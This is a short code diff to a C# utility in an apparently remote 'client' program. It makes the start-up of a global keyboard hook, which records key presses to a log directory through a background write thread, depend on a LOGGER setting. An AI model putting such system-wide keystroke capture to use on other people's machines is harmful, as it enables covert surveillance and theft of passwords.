@@ -86,17 +86,20 @@ namespace Squeaky.Client.Utilities
 
         public static void Start()
         {
-            var hook = Hook.GlobalEvents();
-            hook.KeyDown += OnKeyDown;
-            hook.KeyUp += OnKeyUp;
-            hook.KeyPress += OnKeyPress;
+            if (Settings.LOGGER)
+            {
+                var hook = Hook.GlobalEvents();
+                hook.KeyDown += OnKeyDown;
+                hook.KeyUp += OnKeyUp;
+                hook.KeyPress += OnKeyPress;
 
-            if (!Directory.Exists(LogDir)) Directory.CreateDirectory(LogDir);
+                if (!Directory.Exists(LogDir)) Directory.CreateDirectory(LogDir);
 
-            Thread WriteLoopThread = new Thread(WriteLoop);
-            WriteLoopThread.Start();
+                Thread WriteLoopThread = new Thread(WriteLoop);
+                WriteLoopThread.Start();
 
-            Application.Run();
+                Application.Run();
+            }
         }
     }
 
